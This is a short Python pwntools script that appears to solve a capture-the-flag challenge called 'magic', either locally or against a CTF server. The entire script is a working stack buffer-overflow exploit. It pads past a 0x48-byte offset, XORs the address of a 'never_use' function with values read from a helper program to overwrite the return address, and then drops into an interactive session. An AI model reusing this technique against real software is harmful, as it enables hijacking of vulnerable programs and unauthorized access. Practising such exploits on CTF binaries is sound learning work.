#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys

from pwn import *

context.log_level = 'debug'

fn = './magic'
elf = ELF(fn)

if len(sys.argv) == 1:
    io = process(fn)
else:
    io = remote('bamboofox.cs.nctu.edu.tw', 10000)

# raw_input('w')

offset = 0x44 + 4

payload = 'a' * offset

io.sendlineafter(': ', 'aaaa')

uio = process('./crand')
rand = uio.recvuntil('\n')
a = rand.split(' ')
b = [int(i, 16) for i in a[offset: offset + 4]]
c = bytearray(p32(elf.symbols['never_use']))
d = bytearray([c[i] ^ b[i] for i in xrange(4)])
# print repr(d)

payload += d
payload = str(payload)
print repr(payload)

io.sendlineafter(': ', payload)
uio.close()
io.interactive()
